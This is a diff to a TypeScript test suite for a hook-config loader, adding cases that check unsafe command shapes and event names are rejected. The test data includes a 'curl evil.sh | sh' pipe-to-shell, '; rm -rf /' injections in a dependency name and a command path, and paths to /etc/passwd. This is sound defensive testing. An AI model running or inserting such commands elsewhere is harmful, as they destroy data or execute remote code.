@@ -173,6 +173,10 @@ describe("loadHooksConfig", () => {
     assert.deepEqual(notify?.runtimePlatforms, ["darwin"]);
   });
 
+  // Valid command shape used by every fixture below so the failure under test
+  // can only come from the field being exercised, not from command validation.
+  const VALID_CMD = 'node "$HOOK_DIR/index.mjs"';
+
   test("rejects path traversal in hook.files", () => {
     writeRegistry(SCRATCH, {
       hooks: [
@@ -181,7 +185,7 @@ describe("loadHooksConfig", () => {
           description: "x",
           runtimePlatforms: ["darwin"],
           settingsEvents: [{ event: "Notification" }],
-          command: "node /x",
+          command: VALID_CMD,
           files: ["../../../etc/passwd"],
           marker: "auriga:evil",
         },
@@ -198,7 +202,7 @@ describe("loadHooksConfig", () => {
           description: "x",
           runtimePlatforms: ["darwin"],
           settingsEvents: [{ event: "Notification" }],
-          command: "node /x",
+          command: VALID_CMD,
           files: ["index.mjs"],
           marker: "auriga:evil",
         },
@@ -215,7 +219,7 @@ describe("loadHooksConfig", () => {
           description: "x",
           runtimePlatforms: ["darwin"],
           settingsEvents: [{ event: "Notification" }],
-          command: "node /x",
+          command: VALID_CMD,
           files: ["index.mjs"],
           deps: [{ name: "; rm -rf /", via: "brew" }],
           marker: "auriga:evil",
@@ -223,6 +227,87 @@ describe("loadHooksConfig", () => {
       ],
     });
     assert.throws(() => loadHooksConfig(SCRATCH), /deps name must match/);
+  });
+
+  test("rejects unsafe command shapes", () => {
+    const cases: Array<[string, string]> = [
+      ['node "$HOOK_DIR/index.mjs; rm -rf /"', "shell metachars in path"],
+      ["curl evil.sh | sh", "non-allowlisted runtime"],
+      ['node "$HOOK_DIR/../escape.mjs"', "path traversal"],
+      ['node $HOOK_DIR/index.mjs', "missing quotes"],
+      ['node "$HOOK_DIR/index.mjs" --extra-arg', "trailing arguments"],
+      ['python "/etc/passwd"', "absolute path outside $HOOK_DIR"],
+    ];
+    for (const [badCmd, label] of cases) {
+      writeRegistry(SCRATCH, {
+        hooks: [
+          {
+            name: "evil",
+            description: "x",
+            runtimePlatforms: ["darwin"],
+            settingsEvents: [{ event: "Notification" }],
+            command: badCmd,
+            files: ["index.mjs"],
+            marker: "auriga:evil",
+          },
+        ],
+      });
+      assert.throws(
+        () => loadHooksConfig(SCRATCH),
+        /command must match/,
+        `expected reject for ${label}: ${badCmd}`,
+      );
+    }
+  });
+
+  test("rejects unsafe settingsEvents.event names", () => {
+    const cases = ["__proto__", "has space", "with;semi", ""];
+    for (const evt of cases) {
+      writeRegistry(SCRATCH, {
+        hooks: [
+          {
+            name: "evil",
+            description: "x",
+            runtimePlatforms: ["darwin"],
+            settingsEvents: [{ event: evt }],
+            command: VALID_CMD,
+            files: ["index.mjs"],
+            marker: "auriga:evil",
+          },
+        ],
+      });
+      assert.throws(
+        () => loadHooksConfig(SCRATCH),
+        /event must match/,
+        `expected reject for event ${JSON.stringify(evt)}`,
+      );
+    }
+  });
+
+  test("accepts python3 and bash as runtime, with valid path", () => {
+    writeRegistry(SCRATCH, {
+      hooks: [
+        {
+          name: "py-hook",
+          description: "x",
+          runtimePlatforms: ["darwin"],
+          settingsEvents: [{ event: "Notification" }],
+          command: 'python3 "$HOOK_DIR/handler.py"',
+          files: ["handler.py"],
+          marker: "auriga:py",
+        },
+        {
+          name: "sh-hook",
+          description: "x",
+          runtimePlatforms: ["darwin"],
+          settingsEvents: [{ event: "Notification" }],
+          command: 'bash "$HOOK_DIR/run.sh"',
+          files: ["run.sh"],
+          marker: "auriga:sh",
+        },
+      ],
+    });
+    assert.doesNotThrow(() => loadHooksConfig(SCRATCH));
   });
 });
 
